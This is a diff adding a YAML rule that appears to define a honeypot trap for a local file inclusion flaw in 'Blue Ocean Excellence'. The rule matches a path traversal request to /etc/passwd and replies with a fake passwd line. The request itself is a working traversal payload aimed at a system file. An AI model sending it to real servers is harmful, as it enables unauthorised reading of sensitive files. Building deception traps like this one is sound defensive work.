@@ -1,0 +1,25 @@
+id: blue-ocean-excellence-lfi
+info:
+  name: Blue Ocean Excellence - Local File Inclusion
+  author: pikpikcu
+  description: Blue Ocean Excellence is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://blog.csdn.net/qq_41901122/article/details/116786883
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: blue-ocean,lfi
+traps:
+- request:
+    method: GET
+    path: /download.php?file=../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: toor:[x*]:0:0
